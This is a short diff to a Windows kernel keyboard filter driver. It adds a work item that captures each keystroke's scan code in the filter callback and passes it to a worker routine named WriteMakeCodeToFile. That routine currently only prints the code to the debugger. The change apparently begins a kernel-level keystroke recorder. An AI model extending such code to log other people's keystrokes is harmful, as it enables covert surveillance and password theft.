@@ -1,6 +1,7 @@
 #include "Filter.h"
 
 
+
 #ifdef ALLOC_PRAGMA
 #pragma alloc_text (INIT, DriverEntry)
 #pragma alloc_text (PAGE, FilterEvtDeviceAdd)
@@ -237,6 +238,16 @@ FilterServiceCallback(
     KdPrint(("Keyboard filter: FilterServiceCallback\n"));
     KdPrint(("MakeCode: %hu\n", InputDataStart->MakeCode));
 
+    PWORKER_DATA data = (PWORKER_DATA)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(WORKER_DATA), 0x64657246);
+    if (data) {
+        data->Item = IoAllocateWorkItem(DeviceObject);
+        data->MakeCode = InputDataStart->MakeCode;
+        IoQueueWorkItem(data->Item, (PIO_WORKITEM_ROUTINE)WriteMakeCodeToFile, DelayedWorkQueue, data);
+    }
+    else {
+        KdPrint(("Could not allocate memory with ExAllocatePool2"));
+    }
+
     device = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);
 
     filterExt = FilterGetData(device);
@@ -273,6 +284,16 @@ FilterForwardRequest(
         WdfRequestComplete(Request, status);
     }
     return;
+}
+
+VOID WriteMakeCodeToFile(IN PWORKER_DATA data) {
+    PAGED_CODE();
+
+    KdPrint(("IRQLWorker: %hu\n", KeGetCurrentIrql()));
+    KdPrint(("MakeCodeWorker: %hu\n", data->MakeCode));
+
+    IoFreeWorkItem(data->Item);
+    ExFreePool(data);
 }
 
 #if FORWARD_REQUEST_WITH_COMPLETION
